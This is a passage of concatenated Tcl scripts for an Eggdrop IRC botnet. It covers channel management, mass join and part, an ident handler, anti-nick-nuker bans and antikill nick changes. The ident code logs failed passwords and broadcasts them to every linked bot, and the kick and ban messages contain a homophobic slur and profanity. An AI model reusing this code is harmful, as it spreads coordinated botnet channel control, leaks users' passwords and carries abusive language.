 if ![validchan $c] {return 0}
 if [string match *i* [lindex [getchanmode $c] 0]] {return 1} {return 0}
}

proc take_key {bot cmd arg} {
global botnick chankeys
 set chan [lindex [set arg [split $arg " "]] 0]
 if ![validchan $chan] return
 set key [lindex $arg 1]
 set chankeys([string tolower $chan]) $key
 if [onchan $botnick $chan] return
 putserv "JOIN $chan $key"
}

proc fix_chans {} {
global botnet-nick cycchan
 foreach ch [channels] {
  if ![joinable $ch] {
   catch {
    channel remove $ch
    puthelp "PART $ch"
    putallbots "delchan $ch"
    mychannels ${botnet-nick} mychannels [channels]
    sec_alert - "Removed bad channel: $ch"
   }
  } {
   set i [channel info $ch]
   if [string match {*+bitch*} $i] {
    if [string match {*+autoop*} $i] {
     channel set $ch -autoop 
     sec_notice - "Channel $ch has +bitch and +autoop in same time => -autoop"
    }
   }
  }
 }
 foreach c [string tolower [channels]] {
  channel set $c -revenge -statuslog
  channel set $c need-op [list get_oped $c]
  channel set $c need-key [list get_key $c]
  channel set $c need-invite [list get_invited $c]
  channel set $c need-unban [list get_unban $c]
  channel set $c need-limit [list get_limit $c]
 }
}

timer 5 fix_chans
if ![string match "*fix_chans*" [timers]] {timer 5 fix_chans}

proc tnt_mode {h i a} {
 regsub "  *" $a " " a
 set a [split $a " "]
 set ch [lindex $a 0]
 if {![joinable $ch]} {
  putdcc $i "Specify RIGHT channel!"
  return 0
 }
 set chinfo [if [validchan $ch] {
  set curmode [lindex [lindex [channel info $ch] 0] 0]
  channel info $ch
 } {
  set curmode "??"
  channel info [lindex [channels] 0]
 }]
 set validmodes [lrange $chinfo 7 end]
 regsub -all "\[\+\-\]" $validmodes "" validmodes
 if {[lrange $a 1 end]==""} {
  if [validchan $ch] {
   putdcc $i "Current modes for $ch:"
   putdcc $i " idle-kick: [lindex $chinfo 1]"
   putdcc $i " chan-mode: [lindex $chinfo 0]"
   putdcc $i " bot-modes: [lrange $chinfo 7 end]"
  } {
   putdcc $i "I'm not on $ch."
  }
  return 1
 }
 foreach mode [lrange $a 1 end] {
  regsub "^\[\+\-\]" $mode "" mod
  regsub -all "\[stinklmp\+\-\]" $mode "" chmod
  regsub -all "\[0-9\]" $mode "" idle
  if {[lsearch $validmodes $mod]+1} {
   sec_notice - "#$h# changed bot-mode for $ch new mode is $mode"
   catch {channel set $ch $mode}
   putallbots "mod $ch $mode"
  } elseif {$chmod==""} {
   sec_notice - "#$h# chan-mode for $ch ($curmode) -> ($mode)"
   catch {channel set $ch chanmode "$mode"}
   putallbots "chanm $ch $mode"
  } elseif {$idle==""} {
   sec_notice - "#$h# changed idle-kick for $ch new idle is $mode"
   catch {channel set $ch idle-kick "$mode"}
   putallbots "idle $ch $mode"
  } {
   putdcc $i "Illegal mode specified: \"$mode\""
   putdcc $i " Valid idle time: 0..n"
   putdcc $i " Valid channel modes: +/- s t i n k m l m p"
   putdcc $i " Valid bots modes: +/- $validmodes"
   putdcc $i "<Example> .mode #channel +stinkm +bitch"
   return 1
  }
 }
 savechannels
 return 1
}

proc idle_kick {hand idx arg} {tnt_mode $hand $idx $arg}
proc mode_change {hand idx arg} {tnt_mode $hand $idx $arg}
proc chan_mode {hand idx arg} {tnt_mode $hand $idx $arg}

proc i_kick {b k a} {
 set c [lindex [set a [split $a " "]] 0]
 set m [lindex $a 1]
 if ![validchan $c] return
 set ik [lindex [channel info $c] 1]
 if {$ik!=$m} {
  putseclog "% Changed idle-kick time: $c $m from $b"
  channel set $c idle-kick $m
  savechannels
 }
}

proc bot_chanm {bot cmd a} {
 set channel [lindex [set arg [split $a " "]] 0]
 set mode [string tolower [lindex $arg 1]]
 if ![validchan $channel] return
 set cm [lindex [lindex [channel info $channel] 0] 0]
 if {$cm!=$mode} {
  putseclog "% Changed chan-mode: $channel $mode from $bot"
  channel set $channel chanmode "$mode"
  savechannels
 }
 bitch_kick ni ho ha $channel $mode
}

proc mod_change {bot cmd a} {
 set channel [lindex [set arg [split $a " "]] 0]
 set mode [string tolower [lindex $arg 1]]
 if ![validchan $channel] return
 set cm [lrange [channel info $channel] 7 end]
 if {[lsearch $cm $mode]==-1} {
  putcmdlog "% Changed bot-mode: $channel $mode from $bot"
  if [regexp -nocase ".*need.*" $mode] {
   sec_alert $idx "Bad setmode $arg by $bot"
   return
  }
  channel set $channel $mode
  savechannels
 }
 bitch_kick ni ho ha $channel $mode
}

proc msg_nothing {which nick uhost handle v} {
 set hand [join [lindex [split $v " "] 1]]
 if {$hand==""} {set hand $nick}
 putlog "::Phorce::($nick!$uhost) !*! $hand Tried to msg $which"
}

proc pub_dont_invite {nick host handle channel arg} {return 0}
proc savall args save
proc pub_dont_op {nick host handle channel arg} {}
set dont_voice_in_channels [string tolower $dont_voice_in_channels]

proc put_voice {nick chan} {
 if ![validchan $chan] return
 if ![onchan $nick $chan] return
 if [isvoice $nick $chan] return
 if [isop $nick $chan] return
 pushmode $chan +v $nick
}

proc flag_note {hand idx a} {
 set arg [split $a " "]
 set wha_flag [lindex $arg 0]
 set da_note [join [lrange $arg 1 end]]
 if {$da_note == ""} {
  putdcc $idx "USAGE: .flagnote <flag> <message>"
  return 0
 }
 if ![string match "*$wha_flag*" "pojkfcnmdxp0123456789"] {
  putdcc $idx "Flag \002 +$wha_flag \002 is not a User Defined Flag."
  return 0
 }
 set flagnote_userlist [userlist $wha_flag]
 set topnum [llength $flagnote_userlist]
 putdcc $idx "Writing note To The users with \002 +$wha_flag \002 Flag. There are \002 $topnum \002 users with this Flag."
 set counter 0
 while {$counter != $topnum} {
  set to_user [lindex $flagnote_userlist $counter]
  if {![matchattr $to_user b] && [matchattr $to_user p]} {
   sendnote $hand $to_user "\002 To: +$wha_flag Users: \002 $da_note"
  }
  incr counter 1
 }
 return 0
}

proc lag_reply {nick uhost hand dest key arg} {
global lreply
 if {[info exists lreply] && $lreply} return
 if {"PING"==$key} {
  set lagg [expr [unixtime] - $arg]
  puthelp "NOTICE $nick :\[$nick PING REPLY\] $lagg seconds"
  putcmdlog "\[$nick PING REPLY\] $lagg seconds"
 }
}

proc dcc_botcycle {h idx ch} {
global botnick
 if ![joinable $ch] {
  putdcc $idx "syntax: .cycle #channel"
  return 0
 }
 if ![onchan $botnick $ch] {
  putdcc $idx "Im not on $ch!"
 } {
  putserv "PART $ch"
  putserv "JOIN $ch [lindex [getchanmode $ch] 1]"
 }
 return 1
}

proc joiner {nick uhost handle c}  {
global botnick dont_voice_in_channels
 set c [string tolower $c]
 if [regexp -nocase dcc $nick] {if {[lsearch $dont_voice_in_channels $c]+1} return}
 if {[ophash $c]!=5} return
 utimer 1 "put_voice $nick $c"
}

proc chap {bot cmd a} {
 set n [lindex [set arg [split $a " "]] 0]
 set p [lindex $arg 1]
 sec_alert - "mchpass from $bot -> chpass $n $p"
 return
}

proc msg_ident {nick uhost handle a} {
global gpass
 set vars [split $a " "]
 if {[set hand [string tolower [lindex $vars 1]]]==""} {set hand $nick}
 set gp [set gpass($hand) [set pass [lindex $vars 0]]]
 if [passwdok $hand ""] {
  sec_notice - "Failed IDENT($gp) from $nick!$uhost) for passwordless user $hand"
 } elseif {![passwdok $hand $pass] || $gp!="-"} {
  [if {$gp=="-"} {set tmp sec_notice} {set tmp sec_alert}] - "Failed IDENT($gp) from $nick ($uhost) for user $hand, ignoring"
  putallbots "noop\nidfail $nick $pass"
 } {
  if [matchattr $handle p] {
   puthelp "NOTICE $nick : Hi, $handle."
  } {
   if {[passwdok $hand $pass]} {
    if {[matchattr $hand b]} {
     sec_notice -  "Failed bot $hand IDENT($gp) from $nick ($uhost), ignoring"
     set gpass($hand) BOT?!
    } {
     addhost $hand [newmaskhost $uhost]
     sec_notice -  "Phorce:($nick!$uhost) !*! IDENT $hand"
     puthelp "NOTICE $nick :Ident: Added hostmask [newmaskhost $uhost]."
     set gpass($hand) Success
    }
   }
  }
 }
 if {$gp!="-"} {catch {putwlog "$hand Ident [chattr $hand] - $nick!$uhost $gp"}}
}

proc do_save {args} {save;putallbots svall;return 1}

proc newmaskhost {uh} {
set last_char ""
set past_ident "0"
set response ""
 for {set i 0} {$i < [string length $uh]} {incr i} {
  set char [string index $uh $i]
  if {$char == "@"} {set past_ident "2"}
  if {$past_ident == "2"} {set past_ident "1"}
  if {($char != "0") && ($char != "1") && ($char != "2") && ($char != "3") && ($char != "4") && ($char != "5") && ($char != "6") && ($char != "7") && ($char != "8") && ($char != "9")} {
   set response "$response$char"
   set last_char ""
  } {
   if {($last_char != "x") && ($past_ident == "1")} {
    append response "*" 
    set last_char "x"
   }
   if {$past_ident == "0"} {
    append response "$char" 
   }
  }
 }
 if {[regexp -nocase [string trimleft $response [string range $response 0 [expr [string first "@" $response] - 1 ]]] "@*.*.*.*"]} {
  set response [maskhost $uh]
  return $response
 }
 return "*!$response"
}

proc add_chan {hand idx a} {
global botnet-nick
 set chan [lindex [set a [split $a " "]] end]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 if ![joinable $chan] {
  putdcc $idx "syntax: .mjoin bots|* #channel"
  return 0
 }
 set chan [list $chan]
 dccbroadcast "-$hand- did a massjoin ($bots) to $chan"
 putallbots "addc $chan $bots"
 bot_addc ${botnet-nick}:$hand addc "$chan $bots"
}

proc new_chan {hand idx a} {
global botnet-nick cycchan
 set chan [lindex [split $a " "] 0]
 if ![joinable $chan] {
  putdcc $idx "syntax: .join #channel"
  return 0
 }
 sec_notice - "-$hand- added $chan to my channel list"
 catch {unset cycchan($chan)}
 channel add $chan {
  chanmode "+stn"
  idle-kick 0
 }
 putallbots "addchan $chan"
 mychannels ${botnet-nick} mychannels [channels]
 channel set $chan +enforcebans +dynamicbans +shared +stopnethack +bitch +userbans
 channel set $chan -revenge -secret -clearbans -protectops -statuslog -autoop -greet
 channel set $chan need-op [list get_oped $chan]
 channel set $chan need-key [list get_key $chan]
 channel set $chan need-invite [list get_invited $chan]
 channel set $chan need-unban [list get_unban $chan]
 channel set $chan need-limit [list get_limit $chan]
 savechannels
 return 1
}

proc bot_addc {bot cmd a} {
global botnick botnet-nick secauth opery mass-join
 set a [split $a " "]
 set chan [lindex $a 0]
 set bots [string tolower [lrange $a 1 end]]
 putseclog "*** ($bot) %% massJOIN $chan ($bots)"
 if [info exist secauth] {if $secauth return}
 if [info exist mass-join] {if !${mass-join} return}
 if {$bots=="*"} {set bots [string tolower "${botnet-nick} $botnick"]}
 regsub -all "," $bots " " bots
 regsub -all "  *" $bots " " bots
 if {![expr 1+[lsearch $bots [string tolower $botnick]]] && ![expr 1+[lsearch $bots [string tolower ${botnet-nick}]]]} return
 if {![joinable $chan]} {dccbroadcast "#$bot# I'm not want join to $chan";return}
 if [regexp -nocase -- ".*oper.*|.*\\\..*" $chan] {dccbroadcast "#$bot# I'm not want to join $chan";return}
 set opery($chan) 1
 catch {unset cycchan($chan)}
 channel add $chan {
  chanmode "+sn"
  idle-kick 0
 }
 putallbots "addchan $chan"
 mychannels ${botnet-nick} mychannels [channels]
 channel set $chan +enforcebans +dynamicbans +shared +stopnethack +bitch +userbans
 channel set $chan -revenge -secret -clearbans -protectops -statuslog -autoop -greet
 channel set $chan need-op [list get_oped $chan]
 channel set $chan need-key [list get_key $chan]
 channel set $chan need-invite [list get_invited $chan]
 channel set $chan need-unban [list get_unban $chan]
 channel set $chan need-limit [list get_limit $chan]
 savechannels
}

proc rem_chan {hand idx a} {
global botnet-nick
 set a [split $a " "]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 set chan [lindex $a end]
 if {$bots=="" || ![joinable $chan]} {
  putdcc $idx "syntax: .mpart bot,bot|number #channel"
  return 0
 }
 set chan [list $chan]
 sec_notice - "#$hand# did a masspart ($bots) from $chan"
 putallbots "remc $chan $bots"
 bot_remc ${botnet-nick}:$hand remc "$chan $bots"
}

proc lev_chan {hand idx args} {
global botnet-nick cycchan
 set chan [split [lindex $args 0] " "]
 if {![joinable $chan]} {
  putdcc $idx "syntax: .part #channel"
  return 0
 }
 sec_notice - "#$hand# removed $chan from me"
 catch {unset cycchan($chan)}
 if ![validchan $chan] return
 channel remove $chan
 puthelp "PART $chan"
 putallbots "delchan $chan"
 mychannels ${botnet-nick} mychannels [channels]
 savechannels
}

proc bot_remc {bot cmd a} {
global botnick botnet-nick cycchan secauth mass-join
 set chan [lindex [set a [split $a " "]] 0]
 set bots [string tolower [lrange $a 1 end]]
 putseclog "*** ($bot) %% massPART $chan ($bots)"
 if [info exist secauth] {if $secauth return}
 if [info exist mass-join] {if !${mass-join} return}
 catch {
  incr bots 0
  set t [ophash $chan]
  if {($t<0)||($t>$bots)} {set bots [string tolower $botnick]}
 }
 regsub -all "," $bots " " bots
 regsub -all "  *" $bots " " bots
 if {![expr 1+[lsearch $bots [string tolower $botnick]]] && ![expr 1+[lsearch $bots [string tolower ${botnet-nick}]]]} return
 catch {unset cycchan($chan)}
 catch {
  channel remove "$chan"
  puthelp "PART $chan"
  putallbots "delchan $chan"
  mychannels ${botnet-nick} mychannels [channels]
  savechannels
 }
}

proc filt_telnet_act {idx text} {dccsimul $idx ".me [lrange $text 1 end]"}
proc filt_act {idx text} {dccsimul $idx ".me [string trim [lrange $text 1 end] \001]"}
fix_chans

#putlog "Phorce's Tcl: $pm_version by Villian is loaded"
#putlog "Mad improvements By Dream Walker"
putlog "tnt.tcl v$tnt_version --str"
#---@SYN@--------
proc versionreply_tnt {} {
global pm_version tnt_version identmode
 set my ""
 if [info exist identmode] {
  if [string match "on*" $identmode] {
   set my " (ident active)"
  }
 }
 return "tnt-v$tnt_version$my"
}
#end tnt.tcl --
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 

# NukeNicker Protection 2.0 -
#    This is the first tcl to have protection against those pesky
# nukenickers (if you dont know what that is, you dont want this tcl).
# This tcl shouldnt be modified or changed at all, doing so can cause undesired
# results, like major bot fights. If you have any questions, comments, updates,
# or have an idea for a tcl, email me at CrazyToad@usa.net. Edit the following.

set pubchan [lindex [channels] 0]
foreach w [channels] {if [string match "*tnt*" $w] {set pubchan $w}}
set bantime "5"
set banr "Gay Bot NickNuker"

bind sign ob * bots_nuke
bind nick - * bots_nick

set watchnicks "0"

proc bots_nuke {nick uhost handle channel partmsg} {
global bnuked botnick watchnicks
 set bnuked [string tolower $nick]
 set watchnicks "1"
 utimer 30 {set watchnicks "0"}
 utimer 30 {set bnuked "2blahblahblah2"}
}

proc bots_nick {nick uhost handle channel newnick} {
global bnuked botnick watchnicks bantype bantime banr channels
 if {$watchnicks == "0"} {return 0}
 if {$bnuked == [string tolower $newnick]} {
  set banned "*!*[string range $uhost [string first "@" $uhost] end]"
  if {[isban $banned]} {return 0}
  foreach ch [channels] {
   if {[botisop $ch] && [onchan $nick $ch]} {
    if {![isban $banned $ch] && ![ischanban $banned $ch]} {
     if [isop $newnick $ch] {
      putserv "MODE $ch -o+b $newnick $banned"
     } {
      putserv "MODE $ch +b $banned"
     }
    }
    putserv "KICK $ch $newnick :[lindex "nicknuker nicknuke N/Nuke fuck nuker {}\
 {Nick Nucker} {Stop nicknucking} nicknuking $newnick {/MODE #ch +o $newnick}"\
     [rand 11]]"
   }
  }
   if ![isban $banned] {newban $banned $botnick $banr $bantime}
    set bnuked "2blahblahblah2"
    set watchnicks "0"  
 }
}
putlog "\2N\2uke\2/N\2ick Protection 2.0 by CrazyToad +"
  
###
#+bot +botnet killless quit messages,sign flood --str
#
# ANTIKILL.TCL
#   by Robey, 20mar95
#   based on Vassago's antikill.irc script
# modified by Gord-@saFyre, 1 March 1996

set antikill "1"
set killcount 0
set lastkill 0
if {![info exists antikill]} { set antikill 1 }
if {![info exists killthresh]} { set killthresh [expr 1+[rand 3]] }
if {![info exists killtime]} { set killtime 15 }

putlog "AntiKill+ script loaded but [if $antikill {set _a ""} {set _a NOT}] active."

bind sign o * got_sign

set signfludt [unixtime]
proc got_sign {nick uhost hand channel reason} {
global antikill lastkill killtime killcount killthresh signfludt botnick keep-nick
 if !$antikill return
 if ${keep-nick} return
 set bo [string tolower [lsort [oplist $channel o]]]
 set pos [lsearch $bo [string tolower $botnick]]
 set killthresh [expr 1+$pos]
 if {[regexp "Killed.* .*\." $reason] || [regexp -nocase "bot|egg|K-line" $reason] } {
   if {([unixtime] - $lastkill) > $killtime} {
    set lastkill [unixtime]
    set killcount 1
   } {
    incr killcount
    if {$killcount >= $killthresh} {
    if {([unixtime] - $signfludt) < 20} return
    set signfludt [unixtime]
    putlog "MASS Kill detected!  Changing nickname..."
    change_nick
    set lastkill 0
   }
  }
 }    
}

proc randltr {} {
  set x [rand 62]
  return [string range ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 $x $x]
}

set lastnchange [unixtime]
proc change_nick {} {
  global botnick lastnchange
  if {([unixtime] - $lastnchange) < 20} return
  set lastnchange [unixtime]
  set newnick [string range $botnick 0 7][randltr]
  if [rand 2] {set newnick $newnick[randltr]}
  putserv "NICK [string range $newnick 0 8]"
}  

######
#secure .match and .whois (c) 12-feb-1998 by stran9er
# v1.4
# 9 Jun 1998 - 1.3new: .match +bots , .match +users , .match -pass,
# 23 oct 1998 -   1.4: .match -bots

bind filt - .add* snewuzer
bind filt - .+u* snewuzer
bind filt - .+b* snewuzer
bind filt - .chatt* snewuzer
proc snewuzer {i tx} {
 regsub "  *" $tx " " t
 set t [string tolower [split $t " "]]
 switch -- [lindex $t 0] .add - .addu - .addus - .adduse - .adduser - .+u - .+us - .+use - .+user - .+b - .+bo - .+bot {
  set who [idx2hand $i]
  set for [lindex $t 1]
  if {[matchattr $who m] && ![validuser $for]} {utimer 0 "user-set $for createdby $who"}
 } .chatt - .chattr {
  set who [idx2hand $i]
  set for [lindex $t 1]
  set fla [lindex $t 2]
  if {[validuser $for] && ([matchattr $who n] || ([matchattr $who m] && ![matchattr $for n]))} {
   user-set $for chattrby "$who $fla"
  }
 }
 return $tx
}

unbind dcc - whois *dcc:whois
unbind dcc - match *dcc:match
bind dcc o whois secmatch
bind dcc o match secmatch
proc secmatch {ha i a} {
global whois-fields
 set ha [string tolower $ha]
 set fields ${whois-fields}
 set owner [matchattr $ha n];set master [matchattr $ha m]
 set a [split $a " "]
 set mask [lindex $a 0]
 set minf [lindex $a 1]
 set maxf [lindex $a 2]
 if {$maxf==""} {set maxf $minf;set minf 0}
 if {[lindex $a end]=="-"} {set master 0}
 if [string match "*\\\**" $mask] {set match 1} {set match 0}
 if [regexp "\[-+\].*" $mask] {
  regsub -all "\\\-\[^+\]*" $mask "" maskfp
  regsub -all "\\\+" $maskfp "" maskfp
  regsub -all "\\\+\[^-\]*" $mask "" maskfm
  regsub -all "\\\-" $maskfm "" maskfm
  if {$maskfm==""} {set maskfm *} {regsub -all \[\$\+\-\.\^\] $maskfm "" maskfm}
  set maskn *
  set match 1
 } {
  set maskn [string tolower $mask]
  set maskfp ""
  set maskfm *
 }
 if {$maxf=="" || [regexp "\[^0-9\]" $maxf]} {set maxf 20}
 if {$minf=="" || [regexp "\[^0-9\]" $minf]} {set minf 0}
 if $match {putdcc $i "*** Matching '$mask':"}
 set f 0
 putdcc $i " HANDLE   PASS NOTES  FLAGS                     LAST "
 if $match {
  switch -- $maskfp bots { set ul [bots] } users { set ul ""
   foreach w [string tolower [whom *]] {if {[lsearch $ul $w]==-1} {lappend ul [lindex $w 0]}}
  } default { set ul [lsort [userlist $maskfp]]}
  if [string match *pass* $maskfm] {set maskfm -}
  if [string match bots* $maskfm] {set maskfm *;set maskfp b;set ul {}
   foreach w [userlist b] {if {[hand2idx $w]==-1} {lappend ul $w}}
  }
 } {if [validuser $maskn] {set ul $maskn} {set ul ""}}
 foreach n $ul {
  set nl [string tolower $n]
  if {![regexp \[$maskfm\] [chattr $n]] && ([string match $maskn [string tolower [set h [gethosts $n]]]] || [string match $maskn $nl])} {
   if ![string match "\\\**" $n] {
    if {($maskfm=="-") && ![passwdok $n ""]} continue
    incr f
    if {($f<=$minf) && ($f==1)} {putdcc $i "(skipping first $minf)"}
    if {$f==(1+$maxf)} {putdcc $i "(more than $maxf matches; list truncated)"}
    if {($f>=(1+$maxf)) || ($f<=$minf)} continue
    if [passwdok $n ""] {set pass "none"} {set pass "Set "}
    set lo [backtime [getlaston $n]]
    putdcc $i  "[format %-9s $n] $pass [format %-5s [notes $n]] [format %-25s [chattr $n]] $lo"
    foreach c [channels] {
     if {"[set fl [chattr $n $c]][set lo [backtime [getlaston $n $c]]]"!="-NEVER"} {
      putdcc $i "  [format %-18s $c] [format %-25s $fl] $lo"
      if {[set ci [getchaninfo $n $c]]!=""} {putdcc $i "  INFO: $ci"}
     }
    }
    if {$master || ($ha==$nl)} {    
     set ho " \0035 HOSTS: ";set zp ""
     foreach s $h {
      if {([string length $s]+[string length $ho]+20) > 79} {
       putdcc $i $ho;set ho " \0035    ";set zp "    "
      }
      append ho $zp$s
      set zp ", "
     }
     putdcc $i $ho
    }
    if $owner {if {[set c [getcomment $n]]!=""} {putdcc $i "  COMMENT: $c"}}
    if {$master || ($ha==$n)} {if {[set c [getemail $n]]!=""} {putdcc $i "  EMAIL: $c"}}
    if {[set c [getinfo $n]]!=""} {putdcc $i "  INFO: $c"}
    if $master {if {[set c [getaddr $n]]!=""} {putdcc $i "  ADDRESS: $c"}}
    if $master {if {[set c "[getdnloads $n] [getuploads $n]"]!="0 0 0 0"} {
       putdcc $i "  FILES: [lindex $c 0] downloads ([lindex $c 1]k), [lindex $c 2] uploads ([lindex $c 3]k)"}}
    if {$owner && ([set c [user-get $n created]]!="")} {
     if {[set by [user-get $n createdby]]==""} {set by ""} {set by " by $by"}
     if {[set ct [user-get $n chattrby]]==""} {set ct ""} {set ct ", chattr by $ct"}
     putdcc $i " \0032 Created: [backtime $c] ago$by$ct"
    }
    if $master {
     foreach w $fields {
      if {1+[lsearch "created createdby chattrby" $w]} continue
      if {[set c [user-get $n $w]]==""} continue
      if ![regexp "\[^0-9\]" $c] {
       if {$c > 777777777} {set c [backtime $c]}
      }
      putdcc $i " \00314 $w: $c"
     }
    }
   } {
    if {$maskn=="*"} continue
    foreach b $h {
     if [string match $maskn [string tolower $b]] {
      incr f
      if {($f<=$minf) && ($f==1)} {putdcc $i "(skipping first $minf)"}
      if {(1+$f)==(1+$maxf)} {putdcc $i "(more than $maxf matches; list truncated)"}
      if {($f>=(1+$maxf)) || ($f<=$minf)} continue
      set b [split $b ":"]
      set ho [lindex $b 0]
      if {[set ex [lindex $b 1]]==0} {
       set ex perm
      } {
       set ex "after [backtime [expr [unixtime] - ($ex - [unixtime])]]"
      }
      switch -- $n *ban {
       set cr [backtime [lindex $b 2]]
       set lu [backtime [lindex $b 3]]
       set ty BAN
       set who [lindex $b 4]
       set why [split [lindex $b 5] ~]
      } *ignore {
       set ty IGNORE
       set who [lindex $b 2]
       set lu [set cr [backtime [lindex $b 3]]]
       set why [split [lindex $b 4] ~]
      } default {set ty $n;set ex ???;set who raw;set why $b; set lu "";set cr ""}
      putdcc $i "$ty: $ho ($ex)"
      putdcc $i "  $who: $why"
      if {$cr!=""} {
       if {$cr==$lu} {
	putdcc $i "  Created $cr ago"
       } {
	putdcc $i "  Created $cr ago, last used $lu ago"
       }
      }
     }
    }
   }
  }
 }
 if $match {putdcc $i "--- Found $f matches."}
 return 1
}
proc backtime {ut} {
 if !$ut {return NEVER}
 set t [expr [unixtime] - $ut]
 set s [expr $t % 60];set t [expr $t / 60]
 set m [expr $t % 60];set t [expr $t / 60]
 set h [expr $t % 24]
 set d [expr ($t / 24) % 365]
 set y [expr ($t / 24) / 365]
 set r ""
 if {$y > 0} {append r "${y}y"}
 if {$d > 0} {append r "${d}d"}
 if {($h > 0) || ($d > 0) || ($y > 0)} {append r [format %02d $h]:}
 append r [format %02d $m]
 if {$t == 0} {append r ".[format %02d $s]s"} {append r m}
 return $r
}

proc user-get {handle key} {
 set xtra [getxtra $handle]
 for {set i 0} {$i < [llength $xtra]} {incr i} {
  set this [lindex $xtra $i]
  if ![string compare [lindex $this 0] $key] {
   return [lindex $this 1]
  }
 }
 return ""
}
proc user-set {handle key data} {
 set xtra [getxtra $handle]
 # is key already there?
 set outxtra ""
 for {set i 0} {$i < [llength $xtra]} {incr i} {
  set this [lindex $xtra $i]
  if [string compare [lindex $this 0] $key] {
   lappend outxtra $this
  }
 }
 lappend outxtra [list $key $data]
 setxtra $handle $outxtra
}
putlog "secmatch.tcl v.1.4 by stran9er"
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 

